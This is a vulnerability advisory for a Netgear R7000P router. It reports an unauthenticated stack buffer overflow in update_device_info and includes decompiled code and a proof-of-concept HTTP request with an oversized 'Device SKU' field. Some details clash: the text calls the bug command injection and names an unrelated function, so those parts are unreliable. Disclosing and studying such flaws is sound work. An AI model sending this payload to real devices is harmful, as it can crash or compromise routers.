# Buffer Overflow Vulnerability in `update_device_info`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R7000P Router                                        |
| Firmware Version     | V1.3.1.64_10.1.36                                            |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `update_device_info` (`sub_1154C`, processing of `"Device SKU"`) |
| Prerequisites        | No authentication required; attacker must supply crafted JSON input containing the `"Device SKU"` field |

2. Exploitation Path

```c
int __fastcall sub_1154C(_BYTE *a1, const char *a2, char *a3, int a4, char *dest, int n)
{
  ...
  char v23[104]; // [sp+8h] [bp-68h] BYREF
  ...
  else
  {
    v22 = a3;
    v16 = a4;
    while ( 1 )
    {
      ArrayItem = cJSON_GetArrayItem(v13, v11);
      v18 = *(const char **)(cJSON_GetObjectItem(ArrayItem, "Device SKU") + 16);
      memset(v23, 0, 0x40u);
      if ( *v18 == 42 && (v19 = strlen(v18), v18[v19 - 1] == 42) )
        strncpy(v23, v18 + 1, v19 - 2);
      else
        strcpy(v23, v18);
      ...
}
```

3. **Vulnerable Binaries:** The vulnerabilities are located in the `update_device_info` binary.

4. 0-Day Command Injection Exploitation Path: Multiple buffer overflow vulnerabilities are present in the `basicCgiPppoe2_IP` function:
   - Within function `sub_1154C`, line 13 executes `v18 = *(const char **)(cJSON_GetObjectItem(ArrayItem, "Device SKU") + 16)`. When the retrieved value does **not** begin and end with `*`, the data is directly copied into line 18 via `strcpy(v23, v18)` without any length validation, thereby leading to a buffer overflow vulnerability.
   - Within function `sub_1154C`, line 13 executes `v18 = *(const char **)(cJSON_GetObjectItem(ArrayItem, "Device SKU") + 16)`. When the retrieved value **does** begin and end with `*`, the data is directly processed at line 16 via `strncpy(v23, v18 + 1, v19 - 2)` without proper length restriction, which likewise results in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/update_device_info HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/json
Content-Length: 300
Connection: close

{
  "devices": [
    {
      "Device SKU": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",
      "OtherField": "value"
    }
  ]
}
```